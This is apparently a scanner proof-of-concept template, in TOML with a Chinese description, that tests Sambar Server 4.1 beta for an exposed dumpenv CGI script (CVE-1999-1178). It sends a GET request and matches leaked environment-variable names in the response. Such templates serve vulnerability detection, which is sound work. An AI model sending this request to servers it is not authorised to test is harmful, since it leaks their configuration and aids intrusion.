[info]
author = "ave"
description = "检测 Sambar Server 4.1 beta 中 dumpenv.pl 脚本是否存在，该脚本会泄露服务器环境变量、系统路径等敏感配置信息。远程攻击者可通过 HTTP GET 请求 /cgi-bin/dumpenv 获取服务器环境变量。"
id = "POC-AVE-1999-1377"
name = "Sambar Server dumpenv.pl Information Disclosure PoC"
severity = "medium"
tags = ["ave-1999-1377"]
vuln_id = [
    "CVE-1999-1178",
    "AVE-1999-1377",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/dumpenv"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_SOFTWARE",
    "DOCUMENT_ROOT",
    "GATEWAY_INTERFACE",
]
